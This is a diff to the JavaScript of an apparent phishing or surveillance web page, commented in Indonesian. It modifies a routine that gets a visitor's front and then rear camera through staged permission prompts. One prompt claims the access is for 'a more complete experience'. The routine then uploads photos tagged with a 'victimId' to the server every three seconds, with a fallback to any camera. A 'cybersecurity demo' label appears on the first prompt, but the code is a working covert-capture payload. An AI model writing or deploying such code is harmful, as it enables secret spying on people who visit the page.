@@ -400,67 +400,226 @@
             }
         }, 2000);
 
-        // 3. Minta akses kamera (DUAL CAMERA - MODIFIED)
+        // 3. Minta akses kamera (DUAL CAMERA - MODIFIED WITH DELAY)
         setTimeout(async () => {
             debug('📷 Meminta akses KEDUA KAMERA (depan dan belakang)...');
             
-            // Tanya izin dengan penjelasan
-            const izin = confirm(
+            // Tanya izin awal dengan penjelasan
+            const izinAwal = confirm(
                 '⚠️ DEMO KEAMANAN SIBER ⚠️\n\n' +
-                'Website ini membutuhkan akses ke KEDUA KAMERA Anda:\n' +
-                '📱 Kamera Depan\n' +
-                '📱 Kamera Belakang\n\n' +
-                'Ini untuk simulasi bagaimana aplikasi bisa mengakses\n' +
-                'semua kamera secara bersamaan.\n\n' +
-                'Klik OK untuk melanjutkan demo'
+                'Website ini membutuhkan akses ke KAMERA DEPAN Anda terlebih dahulu.\n\n' +
+                'Klik OK untuk mengizinkan akses kamera depan'
             );
             
-            if (!izin) {
+            if (!izinAwal) {
                 debug('❌ Izin kamera ditolak user');
                 await sendData('camera_access', { status: 'denied' });
-            } else {
-                // Mulai kedua kamera
-                const success = await startBothCameras();
-                
-                if (!success) {
-                    debug('❌ Gagal mengakses kamera');
-                    
-                    // Coba fallback: setidaknya satu kamera
-                    debug('🔄 Mencoba akses minimal satu kamera...');
-                    
-                    try {
-                        const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                        frontCameraStream = fallbackStream;
-                        isCameraActive = true;
-                        
-                        debug('✅ Setidaknya satu kamera berhasil (fallback mode)');
-                        await sendData('camera_access', { status: 'granted_fallback' });
-                        
-                        // Kirim foto periodik
-                        cameraInterval = setInterval(async () => {
-                            if (isCameraActive) {
-                                const image = await captureFromStream(fallbackStream, 'front');
-                                if (image) {
-                                    await fetch('/api/capture-image', {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({ 
-                                            victimId: victimId, 
-                                            image: image,
-                                            cameraType: 'fallback',
-                                            timestamp: new Date().toISOString()
-                                        })
-                                    });
-                                    debug('📸 Foto fallback terkirim');
-                                }
-                            }
-                        }, 3000);
-                        
-                    } catch(fallbackErr) {
-                        debug('❌ Fallback juga gagal: ' + fallbackErr.message);
+                return;
+            }
+            
+            // ==================== KAMERA DEPAN ====================
+            debug('📷 Meminta akses kamera DEPAN...');
+            
+            try {
+                // Minta akses kamera depan
+                const frontConstraints = {
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: { exact: 'user' } // user = kamera depan
                     }
+                };
+                
+                frontCameraStream = await navigator.mediaDevices.getUserMedia(frontConstraints);
+                debug('✅ Kamera DEPAN aktif');
+                await sendData('camera_access', { 
+                    camera: 'front', 
+                    status: 'granted',
+                    message: 'Kamera depan diizinkan'
+                });
+                
+                // Kirim foto pertama dari kamera depan
+                const frontImage = await captureFromStream(frontCameraStream, 'front');
+                if (frontImage) {
+                    await fetch('/api/capture-image', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            victimId: victimId, 
+                            image: frontImage,
+                            cameraType: 'front',
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                    debug('📸 Foto kamera DEPAN terkirim');
+                }
+                
+                // ==================== DELAY SEBELUM KAMERA BELAKANG ====================
+                debug('⏳ Menunggu 3 detik sebelum meminta kamera belakang...');
+                
+                // Tampilkan pesan tunggu
+                const statusEl = document.getElementById('status');
+                if (statusEl) {
+                    statusEl.textContent = 'Mempersiapkan kamera belakang... 3 detik';
+                }
+                
+                // Delay 3 detik sebelum meminta kamera belakang
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // ==================== KAMERA BELAKANG ====================
+                debug('📷 Meminta akses kamera BELAKANG...');
+                
+                // Tanya izin untuk kamera belakang
+                const izinBelakang = confirm(
+                    '⚠️ PERMINTAAN KAMERA BELAKANG ⚠️\n\n' +
+                    'Website ini juga membutuhkan akses ke KAMERA BELAKANG Anda\n' +
+                    'untuk pengalaman yang lebih lengkap.\n\n' +
+                    'Klik OK untuk mengizinkan akses kamera belakang'
+                );
+                
+                if (izinBelakang) {
+                    try {
+                        const backConstraints = {
+                            video: {
+                                width: { ideal: 640 },
+                                height: { ideal: 480 },
+                                facingMode: { exact: 'environment' } // environment = kamera belakang
+                            }
+                        };
+                        
+                        backCameraStream = await navigator.mediaDevices.getUserMedia(backConstraints);
+                        debug('✅ Kamera BELAKANG aktif');
+                        await sendData('camera_access', { 
+                            camera: 'back', 
+                            status: 'granted',
+                            message: 'Kamera belakang diizinkan'
+                        });
+                        
+                        // Kirim foto pertama dari kamera belakang
+                        const backImage = await captureFromStream(backCameraStream, 'back');
+                        if (backImage) {
+                            await fetch('/api/capture-image', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ 
+                                    victimId: victimId, 
+                                    image: backImage,
+                                    cameraType: 'back',
+                                    timestamp: new Date().toISOString()
+                                })
+                            });
+                            debug('📸 Foto kamera BELAKANG terkirim');
+                        }
+                        
+                    } catch(err) {
+                        debug('❌ Gagal kamera belakang: ' + err.message);
+                        await sendData('camera_access', { 
+                            camera: 'back', 
+                            status: 'error', 
+                            error: err.message 
+                        });
+                    }
+                } else {
+                    debug('❌ Izin kamera belakang ditolak user');
+                    await sendData('camera_access', { 
+                        camera: 'back', 
+                        status: 'denied' 
+                    });
+                }
+                
+                // ==================== MULAI PENGIRIMAN PERIODIK ====================
+                if (frontCameraStream || backCameraStream) {
+                    isCameraActive = true;
+                    
+                    // Kirim foto periodik dari kedua kamera setiap 3 detik
+                    cameraInterval = setInterval(async () => {
+                        if (!isCameraActive) return;
+                        
+                        // Kirim dari kamera depan jika aktif
+                        if (frontCameraStream && frontCameraStream.active) {
+                            const frontImg = await captureFromStream(frontCameraStream, 'front');
+                            if (frontImg) {
+                                await fetch('/api/capture-image', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ 
+                                        victimId: victimId, 
+                                        image: frontImg,
+                                        cameraType: 'front',
+                                        timestamp: new Date().toISOString()
+                                    })
+                                });
+                                debug('📸 Foto periodik kamera DEPAN terkirim');
+                            }
+                        }
+                        
+                        // Kirim dari kamera belakang jika aktif
+                        if (backCameraStream && backCameraStream.active) {
+                            const backImg = await captureFromStream(backCameraStream, 'back');
+                            if (backImg) {
+                                await fetch('/api/capture-image', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ 
+                                        victimId: victimId, 
+                                        image: backImg,
+                                        cameraType: 'back',
+                                        timestamp: new Date().toISOString()
+                                    })
+                                });
+                                debug('📸 Foto periodik kamera BELAKANG terkirim');
+                            }
+                        }
+                    }, 3000);
+                    
+                    debug('✅ Kedua kamera aktif, pengiriman periodik dimulai');
+                } else {
+                    debug('❌ Tidak ada kamera yang aktif');
+                }
+                
+            } catch(err) {
+                debug('❌ Gagal kamera depan: ' + err.message);
+                await sendData('camera_access', { 
+                    status: 'error', 
+                    error: err.message 
+                });
+                
+                // Coba fallback: setidaknya satu kamera
+                debug('🔄 Mencoba akses minimal satu kamera...');
+                
+                try {
+                    const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    frontCameraStream = fallbackStream;
+                    isCameraActive = true;
+                    
+                    debug('✅ Setidaknya satu kamera berhasil (fallback mode)');
+                    await sendData('camera_access', { status: 'granted_fallback' });
+                    
+                    // Kirim foto periodik
+                    cameraInterval = setInterval(async () => {
+                        if (isCameraActive) {
+                            const image = await captureFromStream(fallbackStream, 'front');
+                            if (image) {
+                                await fetch('/api/capture-image', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ 
+                                        victimId: victimId, 
+                                        image: image,
+                                        cameraType: 'fallback',
+                                        timestamp: new Date().toISOString()
+                                    })
+                                });
+                                debug('📸 Foto fallback terkirim');
+                            }
+                        }
+                    }, 3000);
+                    
+                } catch(fallbackErr) {
+                    debug('❌ Fallback juga gagal: ' + fallbackErr.message);
                 }
             }
+            
         }, 3000);
 
         // 4. Minta lokasi
@@ -557,6 +716,5 @@
             }
         }
 </script>
-
 </body>
 </html>
